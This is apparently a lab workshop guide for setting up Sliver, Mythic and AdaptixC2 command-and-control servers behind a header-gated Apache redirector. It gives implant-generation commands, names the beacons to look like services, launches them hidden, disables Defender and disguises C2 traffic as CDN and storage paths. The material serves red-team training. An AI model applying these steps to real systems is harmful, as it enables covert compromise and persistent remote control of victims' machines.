# redStack: Boot-To-Breach Red Team Platform (C2 Configuration Guide, Tunneled Access)

Stand up all three C2 backends behind the redirector and confirm a working test beacon from each, using the Windows operator workstation as the test platform. This picks up where DEPLOY leaves off (stack live, hosts verified, tunnel up, ShadowGate reachable) and hands off to ATTACK with three validated callback paths.

Order is Sliver, then Mythic, then Adaptix. Each ends with a beacon that stays running as a persistent heartbeat, so if anything in the redirector or a listener breaks later, a dead beacon tells you before the attack does.

| At a glance   |                                                                     |
| ------------- | ------------------------------------------------------------------- |
| Depends on    | DEPLOY complete through Phase 3 (tunnel up, target reachable)        |
| Test platform | Windows operator workstation (via Guacamole RDP)                    |
| Callback host | Redirector public Elastic IP, 443/HTTPS for all three C2s (see Callback architecture)  |
| C2 order      | Sliver, Mythic, Adaptix                                                |
| End state     | Three live beacons on the Windows host, left running as heartbeats   |
| Hands off to  | ATTACK (chain against ShadowGate)                                   |

---

## Callback architecture (read this first)

Every beacon in this lab calls back to the redirector's public Elastic IP on 443 (HTTPS). The redirector then gates and routes the request to the right C2 backend. Three things must line up or the caller gets the CloudEdge decoy page instead of a session.

**Callback host.** Use the redirector public EIP from `deployment_info.txt`, as `https://<REDIR_PUBLIC_IP>/...`. In Tunneled Access the public EIP is always live and is the only callback host that works; the `tun0` IP does not work as a callback because HSL does not route VPN client IPs back to the target. This is why the Windows test beacons here point at the public EIP: it is the exact path ShadowGate will use in ATTACK.

**Header gate.** The redirector drops anything without `X-Request-ID: <TOKEN>`, where `<TOKEN>` is the `X-Request-ID` value from `deployment_info.txt`. Wrong or missing header returns the decoy page.

**URI prefix.** Each C2 has its own prefix. The redirector strips the prefix for Sliver and Mythic before forwarding, and preserves it for Adaptix:

| C2     | URI prefix                | Redirector behavior   | Callback (beacon to redirector) | Backend (redirector to C2) |
| ------ | ------------------------- | --------------------- | ------------------------------ | -------------------------- |
| Sliver | `/cloud/storage/objects/` | strip prefix, forward | 443 (HTTPS)                    | 443 (HTTPS)                |
| Mythic | `/cdn/media/stream/`      | strip prefix, forward | 443 (HTTPS)                    | 443 (HTTPS)                |
| Adaptix| `/edge/cache/assets/`     | preserve full path    | 443 (HTTPS)                    | 443 (HTTPS)                |

The redirector terminates the beacon's TLS on 443 (self-signed in Tunneled Access, with the public IP as SAN), gates on the header and URI, then re-encrypts to each C2's own TLS listener on 443. Every leg is HTTPS end to end: beacon to redirector, and redirector to backend. Both the redirector cert and the backend C2 certs are self-signed, so the beacons skip cert verification (or trust the cert) and the redirector proxies with verification disabled (`SSLProxyVerify none`).

**Test platform.** All three beacons run on the Windows operator workstation. The Mythic UI and both file-transfer paths live there, and it can reach the redirector public EIP the same way ShadowGate will.

> [!TIP]
> Defender is disabled on the lab Windows host by default so unobfuscated implants run. If you re-enabled it, re-disable with `Set-MpPreference -DisableRealtimeMonitoring $true` or the beacon is quarantined.

Values you will reuse below, all from `terraform output deployment_info` (also in `redStack/deployment_info.txt`):

| Placeholder         | Value                           |
| ------------------- | ------------------------------- |
| `<REDIR_PUBLIC_IP>` | redirector public Elastic IP    |
| `<TOKEN>`           | the `X-Request-ID` header token |
| `<LAB_PASSWORD>`    | the lab password                |

---

## Phase A: Sliver

Sliver drives the attack in ATTACK, so it is set up first and in the most depth. Sliver ships with the `redstack` C2 profile pre-generated (the `X-Request-ID` token is baked in) and the `admin` operator config pre-installed.

### Step A1. Open the Sliver host

From the Windows operator, use the MobaXterm **Sliver C2 (SSH)** bookmark under the redStack Sessions folder. (Guacamole's Sliver SSH is a last resort, only if the Windows operator is down or MobaXterm is unreachable.)

**Success:** you land at `admin@sliver:~$`.

**Failure:** Sliver has no public IP; both paths route through the internal VPC. If SSH hangs at the banner, the host may be memory-exhausted from a prior `generate`; reboot the instance.

### Step A2. Connect the client and start the listener

```bash
sliver-client
```

The pre-installed `admin.cfg` loads automatically; you land at `sliver >` within a couple seconds. You may have to hit enter to get the sliver prompt. 

First session per deployment only, import the profile (Sliver persists it afterward):

```text
c2profiles import --file /home/admin/redstack-c2-profile.json --name redstack
```

Start the HTTPS listener on port 443. Sliver auto-generates a self-signed cert for it, which the redirector accepts (it re-encrypts to this listener with verification disabled). Run these one at a time:

```text
https --lhost 0.0.0.0 --lport 443
```

```text
jobs
```

**Success:** `jobs` lists the HTTPS listener as an active job.

**Failure:** "profile with name 'redstack' already exists" is expected on reconnects, ignore it. If the client hangs on connect, `sudo systemctl restart sliver` and wait ~10 seconds.

### Step A3. Generate the implant

**Be sure to replace the `<REDIR_PUBLIC_IP>` with your actual redirector IP that can be found in `deployment_info.txt`.**

> [!NOTE]
> Cross-compilation takes **5 to 7 minutes** and will look like it is hung. It is not — let it run. **While waiting, skip ahead to Step B1** to get logged into Mythic so that time is not wasted.

```text
generate --http https://<REDIR_PUBLIC_IP>/cloud/storage/objects/ --os windows --arch amd64 --format exe --c2profile redstack --save /tmp/sysProxy.exe
```

The `/cloud/storage/objects/` prefix is what the redirector matches, strips, and forwards to the Sliver HTTPS listener on 443. Wrong prefix = decoy.

This is the only Sliver implant you build all workshop. It stays at `/tmp/sysProxy.exe` on the Sliver host and ATTACK reuses it against ShadowGate, so there is no regenerate step later. The name is deliberately service-like, first letter maps to the C2 (s = Sliver).

**Success:** `[*] Implant saved to /tmp/sysProxy.exe`.

**Failure:** SSH hang during generate points at an undersized instance (see Step A1). If it compiles but is owned by root and cannot be pulled, the umask override is missing (`/etc/systemd/system/sliver.service.d/umask.conf`).

### Step A4. Transfer to Windows and execute

In MobaXterm, the Sliver SSH session is running `sliver-client`, so do not `cd` there; it drops the client. Instead use the SFTP panel on the left: browse to `/tmp`, right-click `sysProxy.exe` > Download to `C:\Users\Administrator\Desktop\`. 

Or from PowerShell on the Windows host:

```powershell
scp admin@sliver:/tmp/sysProxy.exe C:\Users\Administrator\Desktop\sysProxy.exe
```

Authenticate with `<LAB_PASSWORD>`. Then launch it. Double-clicking `sysProxy.exe` on the Desktop works and is the simplest option. If you want to suppress the console window (so it does not flash and close on screen), use PowerShell instead:

```powershell
Start-Process -FilePath "C:\Users\Administrator\Desktop\sysProxy.exe" -WindowStyle Hidden
```

Either way, the beacon behavior is identical.

**Success:** within ~10 seconds Sliver prints an incoming session notification.

**Failure:** check Defender quarantine (Event Viewer) and confirm the implant URL used `https://` with the full `/cloud/storage/objects/` prefix.

### Step A5. Confirm and leave running

```text
sessions
use [SESSION_ID]
whoami
ps
```

**Success:** `whoami` returns your machine's hostname and `administrator` (e.g. `EC2AMAZ-XXXXXXX\Administrator` — the hostname is instance-specific and will differ from the example); `ps` returns the process table. Leave this session connected. It is your Sliver heartbeat for the rest of the workshop; do not kill it.

**Failure:** see the wiki Sliver > Troubleshooting > "Implant compiles but never calls back" for the ordered checklist (listener, network path, URL, header, Defender).

---

## Phase B: Mythic

Mythic ships with the HTTP profile and Apollo agent pre-installed, the token pre-baked into the profile, and the web UI reachable from the Windows operator browser only. Go straight to building the payload.

### Step B1. Log in and build the Apollo payload

From the Windows operator (Guacamole RDP), open Chromium to `https://mythic:7443` (or click on the Mythic C2 bookmark) and log in as `mythic_admin` / `<LAB_PASSWORD>`. If the portal will not load or the `http` profile is not accepting connections, see the wiki Mythic > Troubleshooting.

Left sidebar > **Create Payload**. The builder walks you through four sections in order:

1. **Select OS** — choose `Windows`.
2. **Select Payload** — choose `Apollo`. A **Continue from Existing Payload / Start Fresh** toggle appears; select **Start Fresh**.
3. **Build Parameters** — set `output_type` to `WinExe` and click next.
4. **Commands** — keep the default set (`shell`, `ps`, `run`, `upload`) and add `whoami` and `ls`.
	1. Find `whoami` on the left side, toggle it, and press the single arrow `>` to add it to the payload build. Do the same for `ls`. Click next.
5. **C2 Profiles** — pick `http`, click **+ INCLUDE PROFILE**.

On the `http` profile, set only these fields, in the order they appear in the UI. Leave everything else (encryption, kill date, and so on) at its default:

| Field             | Value                                                                                                                                                                                                                      |
| ----------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| callback_host     | `https://<REDIR_PUBLIC_IP>`                                                                                                                                                                                                |
| callback_interval | `2` (seconds; fast cadence for demo visibility)                                                                                                                                                                            |
| callback_jitter   | `20` (percent)                                                                                                                                                                                                             |
| callback_port     | `443`                                                                                                                                                                                                                      |
| headers           | 1. Add a new header: delete the default `Host` text in the new header. <br>2. KEY input `X-Request-ID`<br>3. VALUE: input the token from `deployment_info.txt` (the `X-Request-ID` line). Do not type `<TOKEN>` literally. |
| post_uri          | 1. Remove the default `data`<br>2. Input `cdn/media/stream/update` (with no leading `/`)                                                                                                                                   |
Once all values are accurate, click `Next`.

The `http` profile already carries a default User-Agent (browser-fingerprint) header; leave it. The default `Host` header, however, must be deleted, or the redirector sees the wrong Host and the callback never lands.

Name the payload `msDiag.exe` (service-like, m = Mythic) and click **Create Payload**. 

**While it is building, go ahead and return back to our Sliver beacon and move it to the Windows Desktop Step A4.** 

Once the Mythic Apollo agent finishes building click on download and it lands in `C:\Users\Administrator\Downloads\`; move it to the Desktop so it launches next to the other beacons:

```powershell
Move-Item C:\Users\Administrator\Downloads\msDiag.exe C:\Users\Administrator\Desktop\
```

### Step B2. Execute and confirm

From PowerShell on the Windows host:

```powershell
Start-Process -FilePath "C:\Users\Administrator\Desktop\msDiag.exe" -WindowStyle Hidden
```
**Note: You can also double-click on the icon in the desktop, but then it creates a process window that has to remain open or the beacon will loose session.** 

In the Mythic UI, open Active Callbacks (phone icon). A `windows` / Administrator row appears within a few seconds. Open its tasking pane and run:

```text
whoami
```

**Success:** the callback registers and `whoami` returns `windows\administrator`. Leave the callback active as the Mythic heartbeat.

```text
ps
```

**Success:** the implant shows the processes running on the host. 

**Failure:** see the wiki Mythic > Troubleshooting > "Callback never arrives" (listener, network path via redirector curl test, build params header/`post_uri`, Defender).

---

## Phase C: AdaptixC2

The Adaptix teamserver builds itself during cloud-init and runs headless on the Adaptix host; there is no VNC desktop and nothing to compile by hand. The operator GUI client runs on the Windows workstation. Adaptix's `/edge/cache/assets/` prefix is preserved (not stripped) by the redirector, so the beacon listener URIs must carry the full prefix. The redStack build presets those listener defaults for you, so standing it up is mostly confirming values and clicking Create.

### Step C1. Confirm the teamserver is up

Adaptix is the slowest backend to build (~12 min in cloud-init), so confirm it is running before you connect. From the Adaptix host (MobaXterm **Adaptix C2 (SSH)** bookmark):

```bash
sudo systemctl status adaptix --no-pager
sudo ss -tlnp | grep 4321
```

**Success:** `active (running)` and port 4321 listening. The teamserver auto-starts at the end of its build.

**Failure:** if the service is missing or the build did not finish, run `~/build_adaptix_server.sh` once to rebuild and start it, then re-check. `journalctl -u adaptix` shows startup errors.

### Step C2. Connect the operator client

The AdaptixClient is pre-installed on the Windows operator at `C:\Tools\AdaptixClient\AdaptixClient.exe` (desktop shortcut). From the Windows operator (Guacamole RDP), launch it and click **Connect**. Fill the connection form:

| Field     | Value                              |
| --------- | ---------------------------------- |
| User      | any nickname (e.g. `operator`)     |
| Password  | `<LAB_PASSWORD>`                   |
| URL       | `https://adaptix:4321/adaptix`     |
| Name      | any project name (e.g. `redStack`) |
| Directory | leave default                      |

The endpoint (`/adaptix`) is part of the URL and must be included, or the client returns a login failure. The teamserver runs in password-only mode, so any username works with the lab password.

**Success:** the client connects and opens on an empty sessions view.

**Failure:** "login failure" almost always means the URL is missing `/adaptix`, or the teamserver has not finished building (Step C1). Confirm 4321 is reachable from the Windows host with `Test-NetConnection adaptix -Port 4321`.

### Step C3. Create the BeaconHTTP listener

In the client, open **Listeners** (the headphone icon). Right-click the empty panel at the bottom of the client and choose **Create**. In the Create Listener dialog:

- **Name:** `https` (the **Profile** field auto-fills to `https`)
- **Config:** change it from the default `BeaconDNS` to **BeaconHTTP**

The redStack build has already preset the listener for this lab, so confirm the values and create it. On the **Main settings** tab:

| Field (Main settings) | Preset value                                    |
| --------------------- | ----------------------------------------------- |
| Host & port (Bind)    | `0.0.0.0` / `443`                               |
| Callback addresses    | `<REDIR_PUBLIC_IP>:443` (redirector public EIP) |
| Method                | `POST`                                          |
| URIs                  | three paths under `/edge/cache/assets/`         |
| Use SSL (HTTPS)       | on                                              |

The `X-Request-ID: <TOKEN>` validation header the redirector requires is preset on the **HTTP Headers** tab.

> [!WARNING]
> The `Heartbeat Header` (`X-Beacon-Id`) and `Encryption key` on the Main settings tab are Adaptix's own beacon fields, not the redirector's `X-Request-ID` token. Leave both at their preset/generated values. Do not paste the `X-Request-ID` token into either.

Confirm the callback shows your redirector public EIP and the header shows your real token (both are baked from `deployment_info` at deploy). If either still shows a placeholder, the project loaded a stale cached extender: disconnect, reconnect on a fresh project name, and the presets repopulate.

Create.

**Success:** the BeaconHTTP listener shows running, bound on 443. The teamserver has `CAP_NET_BIND_SERVICE`, so binding 443 as `admin` works, and the redirector re-encrypts to it.

**Failure:** a listener that won't start usually means 443 is already bound or a URI is malformed. Confirm every URI begins with `/edge/cache/assets/`.

### Step C4. Generate the beacon

With the listener selected, open the agent generator (right-click the listener > `Generate agent`, or the client's **Generate** action). In the Generate Agent dialog:

| Field    | Value                             |
| -------- | --------------------------------- |
| Listener | `https` (the BeaconHTTP listener) |
| Agent    | `beacon`                          |
| Profile  | `beacon_1` (leave default)        |
| Arch     | `x64`                             |
| Format   | `Exe`                             |

> [!NOTE]
> **Profile** (`beacon_1`) is just an auto-named preset of these build options; leave it as-is. There is no operating-system field: the OS is fixed by the **Agent** you pick, and the stock `beacon` agent is Windows only, so `Format` (`Exe`, `DLL`, shellcode) produces a Windows PE. A Linux beacon would need a separate Linux agent extender on the teamserver, which this build does not include.

Generate and save it as `axUpdate.exe` (service-like, a = Adaptix). Adaptix cross-compiles the Windows beacon with the mingw toolchain already installed on the teamserver.

> [!NOTE]
> The Adaptix client saves the beacon to `C:\Users\Administrator\AdaptixProjects\redStack\axUpdate.exe` by default, not the Desktop. Move it to the Desktop before executing so the path matches the next step:
> ```powershell
> Move-Item "C:\Users\Administrator\AdaptixProjects\redStack\axUpdate.exe" C:\Users\Administrator\Desktop\axUpdate.exe
> ```

**Success:** `axUpdate.exe` is on the Desktop.

**Failure:** if generation errors, confirm the listener is running and the beacon extender built (`ls /opt/AdaptixC2/dist/extenders/` on the teamserver).

### Step C5. Execute, confirm, leave running

If you saved the beacon on the teamserver rather than the Windows host, pull it from PowerShell on the Windows operator:

```powershell
scp admin@adaptix:/home/admin/axUpdate.exe C:\Users\Administrator\Desktop\axUpdate.exe
```

Then launch it:

```powershell
Start-Process -FilePath "C:\Users\Administrator\Desktop\axUpdate.exe" -WindowStyle Hidden
```

A beacon appears in the Adaptix client's sessions view within ~10 seconds. Right-click it > Interact (open its console) and run a quick check:

```text
getuid
ps list
```

**Success:** `getuid` returns `windows\administrator`. Leave the beacon running as the Adaptix heartbeat; do not kill it.

**Failure:** see the wiki Adaptix > Troubleshooting > "Beacon doesn't call back" (listener running, URI prefix, header, callback EIP, Defender).

---

## All three up: confirm and monitor as heartbeats

With Sliver, Mythic, and Adaptix beacons live, confirm the full front door in one shot from the redirector (MobaXterm **Apache Redirector (SSH)** bookmark):

```bash
sudo /home/admin/test_redirector.sh
```

All three entries under "Testing direct backend connectivity" should show `OK`.

Leave all three beacons running. They are your heartbeats: if the redirector, a listener, or VPC peering breaks during the workshop, the affected beacon goes quiet first. Watch live C2 traffic on the redirector to spot a dead beacon:

```bash
sudo tail -f /var/log/apache2/redirector-ssl-access.log
```

All three beacons hit 443, so they all land in `redirector-ssl-access.log`. You should see periodic GET/POST at each beacon's callback interval, prefixed by C2: `/cloud/storage/objects/` (Sliver), `/cdn/media/stream/` (Mythic), `/edge/cache/assets/` (Adaptix). A prefix that stops appearing is your early warning.

---

> [!NOTE]
> Each framework offers multiple agents/payloads for different use cases: Mythic has Apollo (Windows), Poseidon (Linux/macOS), and others; Adaptix ships its beacon plus additional agents via extenders; Sliver generates Windows, Linux, and macOS implants natively from `generate`. This workshop uses one agent per C2 to keep the path clean, so choosing among the rest is out of scope here.

## Where this hands off

Three validated callback paths, three live heartbeats on the Windows operator, redirector confirmed. ATTACK uses the Sliver path to land a beacon on ShadowGate and escalate; the Mythic and Adaptix heartbeats stay up as config health checks throughout.
